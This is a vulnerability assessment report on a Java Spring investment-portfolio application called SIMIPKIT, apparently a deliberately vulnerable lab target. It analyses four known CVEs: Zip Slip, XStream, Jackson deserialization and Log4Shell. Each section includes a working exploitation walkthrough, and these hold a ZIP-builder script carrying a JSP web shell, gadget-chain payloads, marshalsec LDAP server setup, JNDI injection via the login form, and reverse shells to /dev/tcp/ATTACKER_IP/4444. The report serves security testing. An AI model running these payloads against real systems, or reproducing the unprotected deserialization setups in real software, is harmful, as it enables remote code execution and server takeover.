# SIMIPKIT - Vulnerability Assessment Report

**Application**: SIMIPKIT (Sistem Informasi Manajemen Investasi & Portofolio Klien Terintegrasi)  
**Assessment Type**: Source Code Review & Proof of Concept Validation  
**Assessment Date**: 2026-07-27  
**Assessed Version**: 1.0.0  
**Technology Stack**: Java 11, Spring MVC 5.3.16, Apache Tomcat 9, MySQL  
**Packaging**: WAR (Maven)

---

## Table of Contents

| # | Vulnerability | CVE | CVSS v3.x | Severity |
|---|---|---|---|---|
| 1 | [Zip Slip - Arbitrary File Write via Path Traversal](#1-zip-slip---arbitrary-file-write-via-path-traversal) | CVE-2018-1002202 | 6.5 | Medium |
| 2 | [XStream Deserialization Remote Code Execution](#2-xstream-deserialization-remote-code-execution) | CVE-2020-26217 | 8.8 | High |
| 3 | [Jackson Polymorphic Deserialization Remote Code Execution](#3-jackson-polymorphic-deserialization-remote-code-execution) | CVE-2019-14379 | 9.8 | Critical |
| 4 | [Log4Shell - Remote Code Execution via JNDI Injection](#4-log4shell---remote-code-execution-via-jndi-injection) | CVE-2021-44228 | 10.0 | Critical |

---

## 1. Zip Slip - Arbitrary File Write via Path Traversal

### 1.1 Vulnerability Identification

| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2018-1002202 |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal) |
| **CVSS v3.0 Base Score** | **6.5 (Medium)** |
| **CVSS v3.0 Vector** | `CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` |
| **Affected Component** | `net.lingala.zip4j:zip4j` version `1.3.1` |
| **Fixed In** | `zip4j` version `1.3.3` |

### 1.2 CVE Description

In Zip4j before version 1.3.3, the `ZipFile.extractAll()` method does not validate or sanitize file paths embedded within ZIP archive entries. An attacker can craft a ZIP archive containing entries with directory traversal sequences (e.g., `../../../`) that, when extracted, write files to arbitrary locations on the filesystem outside the intended extraction directory.

### 1.3 Affected Source Files

| File | Role |
|---|---|
| `pom.xml` (line 27) | Declares the vulnerable dependency: `<zip4j.version>1.3.1</zip4j.version>` |
| `src/main/java/com/happy/simipkit/service/DocumentBulkService.java` (line 66) | Calls `zip.extractAll(extractionTarget)` without path validation |
| `src/main/java/com/happy/simipkit/controller/DocumentBulkController.java` (line 51) | HTTP entry point that passes user-uploaded ZIP to the vulnerable service |

### 1.4 Root Cause Analysis

The vulnerability exists because of two compounding factors:

1. **Vulnerable library behavior**: `zip4j` version `1.3.1` internally computes the output path for each ZIP entry by directly concatenating the destination directory with the entry's filename as stored in the archive header. No canonicalization or boundary check is performed to verify that the resolved output path remains within the destination directory.

2. **Missing application-level validation**: In `DocumentBulkService.java`, the `extractBulkUpload()` method calls `zip.extractAll()` at line 66 and immediately trusts the library to safely extract files. No pre-extraction entry name inspection or post-extraction path verification is implemented.

**Vulnerable code path:**

```
DocumentBulkController.handleBulkUpload()          [line 51]
  --> DocumentBulkService.extractBulkUpload()        [line 42]
        --> ZipFile.extractAll(extractionTarget)     [line 66]  <-- VULNERABLE
```

**Relevant code in `DocumentBulkService.java`:**

```java
// Line 48-66
String extractionTarget = UPLOAD_BASE_DIR + clientId + "/";
File targetDir = new File(extractionTarget);
targetDir.mkdirs();

// ...

ZipFile zip = new ZipFile(tempZip);
logger.info("Extracting bulk document upload for client {} to {}", clientId, extractionTarget);
zip.extractAll(extractionTarget);  // No path sanitization on entry names
```

The `UPLOAD_BASE_DIR` is defined as `/opt/simipkit/uploads/documents/` (line 34). When a ZIP entry contains a path such as `../../../../tmp/evil.jsp`, the library resolves the output path as:

```
/opt/simipkit/uploads/documents/<clientId>/../../../../tmp/evil.jsp
```

Which canonicalizes to:

```
/tmp/evil.jsp
```

The post-extraction delta scan (lines 70-78) only examines files inside `targetDir`, so traversed files landing outside this directory are never detected or recorded in the database, but they are still written to disk.

### 1.5 Exploitation Walkthrough

**Prerequisites:**
- Authenticated session (any role: `admin` or `staff`)
- Access to the Bulk KYC Upload page at `/documents/bulk-upload`
- An existing client ID in the system

**Step 1: Craft a malicious ZIP archive**

Use a Python script to create a ZIP file with a path-traversal entry name:

```python
import zipfile
import io
import os

def create_malicious_zip(output_path, traversal_path, payload_content):
    """
    Creates a ZIP archive with a single entry whose filename
    contains directory traversal sequences.
    
    Example traversal_path: "../../../../opt/tomcat/webapps/ROOT/shell.jsp"
    """
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(traversal_path, payload_content)

# Payload: simple JSP web shell
jsp_shell = """<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>"""

# Target: escape /opt/simipkit/uploads/documents/<clientId>/ and write to Tomcat webroot
# Depth calculation: /opt/simipkit/uploads/documents/<clientId>/ = 5 levels deep
traversal = "../../../../../opt/tomcat/webapps/ROOT/cmd.jsp"

create_malicious_zip("malicious_kyc.zip", traversal, jsp_shell)
```

**Step 2: Upload the malicious ZIP via the application**

```
POST /simipkit/documents/bulk-upload HTTP/1.1
Host: <target>:8080
Cookie: JSESSIONID=<authenticated-session>
Content-Type: multipart/form-data; boundary=----FormBoundary

------FormBoundary
Content-Disposition: form-data; name="clientId"

<valid-client-uuid>
------FormBoundary
Content-Disposition: form-data; name="zipFile"; filename="malicious_kyc.zip"
Content-Type: application/zip

<binary ZIP content>
------FormBoundary--
```

**Step 3: Verify file write and execute**

After upload, the traversed file is written outside the intended directory. If targeting the Tomcat webroot:

```bash
curl "http://<target>:8080/cmd.jsp?cmd=id"
# Expected output: uid=<tomcat-uid> gid=<tomcat-gid>
```

**Impact**: Arbitrary file write on the server filesystem with the privileges of the Tomcat process. This can lead to Remote Code Execution through JSP web shell deployment, configuration file overwrite, or SSH key injection.

---

## 2. XStream Deserialization Remote Code Execution

### 2.1 Vulnerability Identification

| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2020-26217 |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **CVSS v3.1 Base Score** | **8.8 (High)** |
| **CVSS v3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Affected Component** | `com.thoughtworks.xstream:xstream` version `1.4.10` |
| **Fixed In** | `xstream` version `1.4.14` |

### 2.2 CVE Description

XStream before version 1.4.14 is vulnerable to Remote Code Execution. The vulnerability allows a remote attacker to run arbitrary shell commands by manipulating the processed input stream when XStream is configured using a blocklist-based security model (which is the default for versions prior to 1.4.14). By crafting a specific XML payload that leverages known Java gadget chains (such as `java.lang.ProcessBuilder`, `javax.imageio.ImageIO$ContainsFilter`, or `java.beans.EventHandler`), the attacker can trigger arbitrary object instantiation and method invocation during the XML-to-Java deserialization process.

### 2.3 Affected Source Files

| File | Role |
|---|---|
| `pom.xml` (line 25) | Declares the vulnerable dependency: `<xstream.version>1.4.10</xstream.version>` |
| `src/main/java/com/happy/simipkit/service/ReportService.java` (lines 52, 63) | Instantiates `XStream` without security configuration; calls `xstream.fromXML()` on user-supplied XML |
| `src/main/java/com/happy/simipkit/controller/ReportTemplateController.java` (line 74) | Passes user-uploaded XML content directly to `reportService.parseReportTemplate()` |

### 2.4 Root Cause Analysis

The vulnerability stems from two factors:

1. **Insecure XStream initialization**: In `ReportService.java` (line 52), the `XStream` instance is created with default settings. No security framework is configured:

    ```java
    // ReportService.java - Constructor (line 50-55)
    public ReportService(JdbcTemplate jdbcTemplate) {
        this.jdbcTemplate = jdbcTemplate;
        this.xstream = new XStream();
        // Intentionally missing:
        // XStream.setupDefaultSecurity(this.xstream);
        // this.xstream.allowTypes(...);
    }
    ```

    Without calling `XStream.setupDefaultSecurity()` or `xstream.addPermission()`, the library operates with its legacy default behavior: it will deserialize any Java class that can be resolved from the classpath.

2. **Direct deserialization of attacker-controlled input**: In `ReportService.java` (line 63), the `parseReportTemplate()` method passes user-supplied XML directly to `xstream.fromXML()`:

    ```java
    // ReportService.java - parseReportTemplate() (line 61-66)
    public Object parseReportTemplate(String xmlContent) {
        logger.info("Parsing report template XML, length: {} chars", xmlContent.length());
        Object templateConfig = xstream.fromXML(xmlContent);  // <-- VULNERABLE
        logger.info("Report template parsed successfully");
        return templateConfig;
    }
    ```

**Vulnerable code path:**

```
ReportTemplateController.handleTemplateUpload()     [line 37]
  --> Reads XML from form field or uploaded file     [lines 44-56]
  --> reportService.parseReportTemplate(contentToParse)  [line 74]
        --> xstream.fromXML(xmlContent)              [line 63]  <-- VULNERABLE
```

**Access control note**: The `/report-template-upload` endpoint is restricted to users with the `admin` role by `RoleAuthorizationFilter`. However, any compromised or malicious administrator account can exploit this vulnerability.

### 2.5 Exploitation Walkthrough

**Prerequisites:**
- Authenticated session with `admin` role
- Access to the Report Template Upload page at `/report-template-upload`

**Step 1: Craft a malicious XML payload**

The following XStream payload leverages the `java.lang.ProcessBuilder` gadget chain available in the JDK classpath to execute an arbitrary OS command (in this example, `touch /tmp/xstream-pwned`):

```xml
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>touch</string>
          <string>/tmp/xstream-pwned</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

This payload works because:
- XStream deserializes a `sorted-set` containing a `String` and a `dynamic-proxy` implementing `Comparable`.
- The `TreeSet` internally calls `compareTo()` on the proxy object.
- The `EventHandler` proxy intercepts the method call and invokes `ProcessBuilder.start()`.
- `ProcessBuilder.start()` executes the OS command defined in the `<command>` list.

**Step 2: Submit the payload via the Report Template Upload form**

```
POST /simipkit/report-template-upload HTTP/1.1
Host: <target>:8080
Cookie: JSESSIONID=<admin-session>
Content-Type: application/x-www-form-urlencoded

namaTemplate=RCE+Test&xmlContent=%3Csorted-set%3E%0A++%3Cstring%3Efoo%3C%2Fstring%3E%0A++%3Cdynamic-proxy%3E%0A++++%3Cinterface%3Ejava.lang.Comparable%3C%2Finterface%3E%0A++++%3Chandler+class%3D%22java.beans.EventHandler%22%3E%0A++++++%3Ctarget+class%3D%22java.lang.ProcessBuilder%22%3E%0A++++++++%3Ccommand%3E%0A++++++++++%3Cstring%3Etouch%3C%2Fstring%3E%0A++++++++++%3Cstring%3E%2Ftmp%2Fxstream-pwned%3C%2Fstring%3E%0A++++++++%3C%2Fcommand%3E%0A++++++%3C%2Ftarget%3E%0A++++++%3Caction%3Estart%3C%2Faction%3E%0A++++%3C%2Fhandler%3E%0A++%3C%2Fdynamic-proxy%3E%0A%3C%2Fsorted-set%3E
```

Alternatively, the payload can be uploaded as an XML file via the `xmlFile` multipart field on the same form.

**Step 3: Verify command execution on the server**

```bash
# On the target server
ls -la /tmp/xstream-pwned
# Expected output: -rw-r--r-- 1 tomcat tomcat 0 <timestamp> /tmp/xstream-pwned
```

For a reverse shell variant, replace the `<command>` element:

```xml
<command>
  <string>bash</string>
  <string>-c</string>
  <string>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</string>
</command>
```

**Impact**: Full Remote Code Execution with the privileges of the Tomcat/Java process. The attacker can read/write arbitrary files, establish reverse shells, pivot to internal networks, or exfiltrate sensitive data including database credentials stored in environment variables.

---

## 3. Jackson Polymorphic Deserialization Remote Code Execution

### 3.1 Vulnerability Identification

| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2019-14379 |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **CVSS v3.1 Base Score** | **9.8 (Critical)** |
| **CVSS v3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Affected Component** | `com.fasterxml.jackson.core:jackson-databind` version `2.9.8` |
| **Fixed In** | `jackson-databind` version `2.9.9.2` |

### 3.2 CVE Description

`SubTypeValidator.java` in FasterXML `jackson-databind` before version 2.9.9.2 mishandles default typing when ehcache is used (specifically, `net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup`), leading to remote code execution. More broadly, `jackson-databind` 2.9.8 lacks a comprehensive blocklist for known gadget classes, meaning that when polymorphic type handling is enabled via `@JsonTypeInfo(use = Id.CLASS)`, an attacker can supply arbitrary class names in the JSON `@class` property. Jackson will instantiate those classes and invoke their setter methods or constructors, potentially triggering code execution through classpath-available gadget chains.

### 3.3 Affected Source Files

| File | Role |
|---|---|
| `pom.xml` (line 26) | Declares the vulnerable dependency: `<jackson.version>2.9.8</jackson.version>` |
| `src/main/java/com/happy/simipkit/model/banksync/BankTransactionEvent.java` (line 21) | Annotated with `@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.PROPERTY, property = "@class")` enabling polymorphic deserialization, and `@JsonDeserialize(using = GatewayExtensionDeserializer.class)` on `gatewayExtensionData` |
| `src/main/java/com/happy/simipkit/deserializer/GatewayExtensionDeserializer.java` (lines 31-34) | Custom Jackson deserializer resolving dynamic types via `Class.forName(typeName)` using the `@type` JSON property |
| `src/main/java/com/happy/simipkit/service/BankSyncService.java` (lines 37, 49) | Instantiates `ObjectMapper` without `PolymorphicTypeValidator`; calls `readValue()` targeting the polymorphic base type |
| `src/main/java/com/happy/simipkit/controller/BankSyncController.java` (line 30) | HTTP entry point accepting raw JSON body and forwarding to the vulnerable service |

### 3.4 Root Cause Analysis

This vulnerability is the result of compounding factors:

1. **Unrestricted polymorphic type annotation on the model class**: In `BankTransactionEvent.java` (line 21), the abstract base class is annotated to accept arbitrary class names from JSON input:

    ```java
    // BankTransactionEvent.java (line 21)
    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.PROPERTY, property = "@class")
    public abstract class BankTransactionEvent {
        // ...
    }
    ```

    This annotation instructs Jackson to read the `@class` field from the incoming JSON payload and instantiate whatever fully qualified Java class is specified, as long as it can be resolved from the classpath.

2. **Dynamic reflection lookup in custom deserializer**: In `GatewayExtensionDeserializer.java` (line 31-34), the custom deserializer attached to `gatewayExtensionData` extracts the `@type` field and dynamically invokes `Class.forName(typeName)` to instantiate target classes:

    ```java
    // GatewayExtensionDeserializer.java (line 31-34)
    String typeName = node.get("@type").asText();
    Class<?> targetClass = Class.forName(typeName);
    ```

3. **Unprotected ObjectMapper instantiation**: In `BankSyncService.java` (line 37), the `ObjectMapper` is created with default settings, without a `PolymorphicTypeValidator`:

    ```java
    // BankSyncService.java (line 35-38)
    public BankSyncService(JdbcTemplate jdbcTemplate) {
        this.jdbcTemplate = jdbcTemplate;
        this.objectMapper = new ObjectMapper();  // No PolymorphicTypeValidator
    }
    ```

4. **Direct deserialization of external input**: In `BankSyncService.java` (line 49), the raw JSON payload is deserialized directly into the polymorphic base type:

    ```java
    // BankSyncService.java (line 49)
    BankTransactionEvent event = objectMapper.readValue(rawJsonPayload, BankTransactionEvent.class);
    ```

**Vulnerable code path:**

```
BankSyncController.receiveBankFeed()                [line 27]
  --> bankSyncService.processIncomingFeed(rawJsonPayload)  [line 30]
        --> objectMapper.readValue(rawJsonPayload, BankTransactionEvent.class)  [line 49]  <-- VULNERABLE
```

**Critical access control note**: The `/api/sync/bank-feed` endpoint is **explicitly excluded** from authentication requirements. In `AuthenticationFilter.java` (line 50), paths starting with `/api/sync/` are allowed through without session validation:

```java
// AuthenticationFilter.java (line 50)
if (path.equals("/login") || path.startsWith("/resources/") || path.startsWith("/api/sync/")) {
    chain.doFilter(request, response);
    return;
}
```

This means the vulnerability is exploitable by **unauthenticated remote attackers**.

### 3.5 Exploitation Walkthrough

**Prerequisites:**
- Network access to the target application
- No authentication required (the endpoint is publicly accessible)

**Step 1: Identify available gadget classes**

Jackson gadget exploitation requires a "gadget class" to be present on the application's classpath. The SIMIPKIT application includes Spring Framework 5.3.16, which provides several known gadget classes. Common gadget chains for `jackson-databind` 2.9.8 include:

- `org.springframework.context.support.ClassPathXmlApplicationContext` (loads remote Spring bean configuration)
- `com.sun.rowset.JdbcRowSetImpl` (triggers JNDI lookup via `setDataSourceName` + `setAutoCommit`)

**Step 2: Craft a malicious JSON payload using the JNDI gadget**

```json
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://ATTACKER_IP:1389/Exploit",
  "autoCommit": true
}
```

This payload instructs Jackson to:
1. Instantiate `com.sun.rowset.JdbcRowSetImpl` (part of the JDK)
2. Call `setDataSourceName("ldap://ATTACKER_IP:1389/Exploit")`
3. Call `setAutoCommit(true)`, which internally triggers a JNDI lookup to `ldap://ATTACKER_IP:1389/Exploit`
4. The attacker's LDAP server responds with a reference to a remote Java class, which the JVM loads and executes

**Step 3: Set up the attacker infrastructure**

On the attacker machine, start a malicious LDAP server (e.g., using `marshalsec`):

```bash
# Terminal 1: Start the LDAP referral server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit" 1389

# Terminal 2: Host the compiled exploit class
python3 -m http.server 8888
```

Compile and serve a malicious Java class:

```java
// Exploit.java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("touch /tmp/jackson-pwned");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

```bash
javac Exploit.java
# Ensure Exploit.class is served by the HTTP server on port 8888
```

**Step 4: Send the payload to the unauthenticated endpoint**

```bash
curl -X POST http://<target>:8080/simipkit/api/sync/bank-feed \
  -H "Content-Type: application/json" \
  -d '{
    "@class": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://ATTACKER_IP:1389/Exploit",
    "autoCommit": true
  }'
```

**Step 5: Verify command execution on the server**

```bash
# On the target server
ls -la /tmp/jackson-pwned
# Expected output: -rw-r--r-- 1 tomcat tomcat 0 <timestamp> /tmp/jackson-pwned
```

Alternative payload using `ClassPathXmlApplicationContext` (single-step, does not require JNDI):

```json
{
  "@class": "org.springframework.context.support.ClassPathXmlApplicationContext",
  "configLocation": "http://ATTACKER_IP:8888/malicious-beans.xml"
}
```

Where `malicious-beans.xml` contains a Spring bean definition that executes commands via `Runtime.exec()`.

**Impact**: Unauthenticated Remote Code Execution. Since no authentication is required to reach this endpoint, any network-adjacent or internet-facing attacker can achieve full system compromise. The attacker gains code execution with the privileges of the Tomcat/Java process, enabling data exfiltration, lateral movement, and complete server takeover.

---

## 4. Log4Shell - Remote Code Execution via JNDI Injection

### 4.1 Vulnerability Identification

| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2021-44228 |
| **CWE** | CWE-917: Improper Neutralization of Special Elements used in an Expression Language Statement (Expression Language Injection) |
| **CVSS v3.1 Base Score** | **10.0 (Critical)** |
| **CVSS v3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Affected Component** | `org.apache.logging.log4j:log4j-core` version `2.14.1` |
| **Fixed In** | `log4j-core` version `2.17.0` (full fix) |

### 4.2 CVE Description

Apache Log4j2 versions 2.0-beta9 through 2.14.1 (inclusive) feature JNDI message lookup substitution enabled by default. When a log message contains a specially crafted string such as `${jndi:ldap://attacker.com/exploit}`, the Log4j2 engine evaluates the embedded expression through its `JndiLookup` plugin. This triggers an outbound JNDI lookup request over LDAP, RMI, or CORBA to an attacker-controlled server. The malicious server responds with a serialized Java object reference pointing to a remote class file, which the target JVM loads and executes, resulting in Remote Code Execution.

### 4.3 Affected Source Files

| File | Role |
|---|---|
| `pom.xml` (line 24) | Declares the vulnerable dependency: `<log4j.version>2.14.1</log4j.version>` |
| `pom.xml` (lines 76-90) | Includes `log4j-core`, `log4j-api`, and `log4j-jcl` at version `2.14.1` |
| `src/main/resources/log4j2.xml` | Log4j2 configuration file with no `%m{nolookups}` mitigation in the pattern layout |
| `src/main/java/com/happy/simipkit/service/AuditLogService.java` (line 30) | Logs user-controlled parameters directly via `logger.info()` |

### 4.4 Root Cause Analysis

The vulnerability is the combination of three factors:

1. **Vulnerable Log4j2 version**: The application uses `log4j-core` version `2.14.1` (declared in `pom.xml` at line 24), which has JNDI message lookup substitution enabled by default.

2. **No lookup mitigation in configuration**: The `log4j2.xml` configuration file uses a standard pattern layout without the `{nolookups}` message pattern flag:

    ```xml
    <!-- log4j2.xml (line 5) -->
    <PatternLayout pattern="%d{yyyy-MM-dd HH:mm:ss} [%t] %-5level %logger{36} - %msg%n"/>
    ```

    The `%msg` directive processes the full log message, including embedded lookup expressions.

3. **User-controlled data in log messages**: In `AuditLogService.java` (line 30), the `logAction()` method logs multiple user-controllable parameters:

    ```java
    // AuditLogService.java (line 28-30)
    public void logAction(Integer userId, String action, String ipAddress, String detail) {
        logger.info("AUDIT LOG -> User: {}, Action: {}, IP: {}, Detail: {}",
                     userId, action, ipAddress, detail);
        // ...
    }
    ```

    The `action`, `ipAddress`, and `detail` parameters frequently originate from user input or HTTP request data. Any of these parameters can carry a JNDI lookup payload.

**Multiple injection points exist across the application.** The `AuditLogService.logAction()` method is called from numerous controllers:

| Controller | Action Logged | User-Controlled Field |
|---|---|---|
| `LoginController.java` (line 94) | `LOGIN_RATE_LIMITED` | `username` parameter in detail string |
| `LoginController.java` (line 119) | `LOGIN_SUCCESS` | `username` parameter in detail string |
| `LoginController.java` (line 126) | `LOGIN_FAILED` | `username` parameter in detail string |
| `DocumentBulkController.java` (line 54) | `BULK_DOCUMENT_UPLOAD` | `clientId` and filename in detail string |
| `ReportTemplateController.java` (line 76) | `TEMPLATE_UPLOAD` | `namaTemplate` in detail string |

**Critical injection via the login form**: The `LoginController` passes the `username` form parameter into the audit log detail string. This is the most accessible injection vector because the login page is accessible **without authentication**.

```java
// LoginController.java (line 126)
auditLogService.logAction(userId, "LOGIN_FAILED", ipAddress,
    "Percobaan login gagal untuk username: " + username);
```

If an attacker submits `${jndi:ldap://attacker.com/exploit}` as the username value during a login attempt, this string flows through `AuditLogService.logAction()` into `logger.info()`, where Log4j2 evaluates the JNDI lookup expression.

### 4.5 Exploitation Walkthrough

**Prerequisites:**
- Network access to the target application
- No authentication required (the login form is publicly accessible)
- An attacker-controlled LDAP/HTTP server

**Step 1: Set up the attacker infrastructure**

On the attacker machine, prepare three components:

```bash
# Terminal 1: Compile the exploit class
cat > Exploit.java << 'EOF'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("touch /tmp/log4shell-pwned");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF
javac Exploit.java

# Terminal 2: Serve the exploit class via HTTP
python3 -m http.server 8888

# Terminal 3: Start the LDAP referral server (using marshalsec)
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit" 1389
```

**Step 2: Inject the JNDI payload via the login form**

Submit a login request with the JNDI lookup string as the username:

```bash
# First, obtain a CSRF token from the login page
CSRF_TOKEN=$(curl -s -c cookies.txt http://<target>:8080/simipkit/login \
  | grep -oP 'name="csrfToken" value="\K[^"]+')

# Submit the login form with the JNDI payload as the username
curl -X POST http://<target>:8080/simipkit/login \
  -b cookies.txt \
  -d "username=\${jndi:ldap://ATTACKER_IP:1389/Exploit}" \
  -d "password=anything" \
  -d "csrfToken=${CSRF_TOKEN}"
```

**What happens internally:**

1. `LoginController.processLogin()` receives the malicious username
2. The login fails (invalid credentials), triggering the failed login branch
3. `auditLogService.logAction()` is called with the detail string containing the JNDI payload
4. `logger.info("AUDIT LOG -> User: {}, Action: {}, IP: {}, Detail: {}", ...)` processes the message
5. Log4j2 encounters `${jndi:ldap://ATTACKER_IP:1389/Exploit}` in the message string
6. The `JndiLookup` plugin initiates an outbound LDAP connection to `ATTACKER_IP:1389`
7. The LDAP server responds with a reference to `http://ATTACKER_IP:8888/Exploit.class`
8. The JVM downloads and executes the `Exploit.class` static initializer block
9. `touch /tmp/log4shell-pwned` is executed on the server

**Step 3: Verify command execution on the server**

```bash
# On the target server
ls -la /tmp/log4shell-pwned
# Expected output: -rw-r--r-- 1 tomcat tomcat 0 <timestamp> /tmp/log4shell-pwned
```

**Out-of-band (OOB) detection alternative** (for blind validation without RCE):

```bash
# Use a DNS Canary / Burp Collaborator / interactsh
curl -X POST http://<target>:8080/simipkit/login \
  -b cookies.txt \
  -d "username=\${jndi:ldap://UNIQUE_ID.oast.fun}" \
  -d "password=anything" \
  -d "csrfToken=${CSRF_TOKEN}"

# Monitor the OOB listener for an incoming DNS/LDAP callback
```

**Reverse shell variant:**

```java
// Exploit.java - reverse shell payload
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c",
                "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

**Impact**: Unauthenticated Remote Code Execution with full system compromise. The attacker does not need any application credentials. A single crafted HTTP request to the publicly accessible login form is sufficient to achieve arbitrary code execution with the privileges of the Java/Tomcat process. This is the highest-severity vulnerability in the application.

---

## Summary of Findings

| # | Vulnerability | CVE | CVSS | Severity | Authentication Required | Affected Endpoint |
|---|---|---|---|---|---|---|
| 1 | Zip Slip (Path Traversal) | CVE-2018-1002202 | 6.5 | Medium | Yes (any role) | `POST /documents/bulk-upload` |
| 2 | XStream Deserialization RCE | CVE-2020-26217 | 8.8 | High | Yes (admin only) | `POST /report-template-upload` |
| 3 | Jackson Polymorphic Deserialization RCE | CVE-2019-14379 | 9.8 | Critical | **No** | `POST /api/sync/bank-feed` |
| 4 | Log4Shell (JNDI Injection RCE) | CVE-2021-44228 | 10.0 | Critical | **No** | `POST /login` (and others) |

### Risk Distribution

```
Critical (CVSS 9.0-10.0):  2 vulnerabilities  (CVE-2019-14379, CVE-2021-44228)
High     (CVSS 7.0-8.9):   1 vulnerability   (CVE-2020-26217)
Medium   (CVSS 4.0-6.9):   1 vulnerability   (CVE-2018-1002202)
```

### Vulnerability Dependency Versions (from `pom.xml`)

| Dependency | Current Version | Vulnerable | Fixed Version |
|---|---|---|---|
| `net.lingala.zip4j:zip4j` | 1.3.1 | Yes | >= 1.3.3 |
| `com.thoughtworks.xstream:xstream` | 1.4.10 | Yes | >= 1.4.14 |
| `com.fasterxml.jackson.core:jackson-databind` | 2.9.8 | Yes | >= 2.9.9.2 |
| `org.apache.logging.log4j:log4j-core` | 2.14.1 | Yes | >= 2.17.0 |

---

*End of Report*
